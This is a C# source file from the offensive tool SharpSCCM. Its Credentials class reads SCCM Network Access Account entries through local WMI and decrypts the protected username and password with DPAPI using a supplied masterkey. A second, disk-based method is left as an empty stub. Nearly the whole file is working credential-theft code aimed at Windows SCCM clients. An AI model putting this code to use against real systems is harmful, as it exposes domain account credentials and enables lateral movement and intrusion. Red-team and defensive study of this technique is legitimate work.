using System;
using System.Runtime.InteropServices;
using System.Management;

namespace SharpSCCM
{
    public class Credentials
    {

        public static void LocalNetworkAccessAccountsDisk(string masterkey)
        {
            // TO DO
        }

        public static void LocalNetworkAccessAccountsWmi(string masterkey)
        {
            ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\localhost\\root\\ccm\\policy\\Machine\\ActualConfig");
            MgmtUtil.GetClassInstances(sccmConnection, "CCM_NetworkAccessAccount");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
            ManagementObjectCollection accounts = searcher.Get();
            if (accounts.Count > 0)
            {
                foreach (ManagementObject account in accounts)
                {
                    string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                    string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
                    byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                    int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                    Array.Resize(ref protectedUsernameBytes, length);
                    try
                    {

                        Dpapi.Execute(protectedUsername, masterkey);
                        Dpapi.Execute(protectedPassword, masterkey);

                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                        Console.WriteLine(e.ToString());
                    }
                }
            }
            else
            {
                Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount");
            }
        }
    }
}
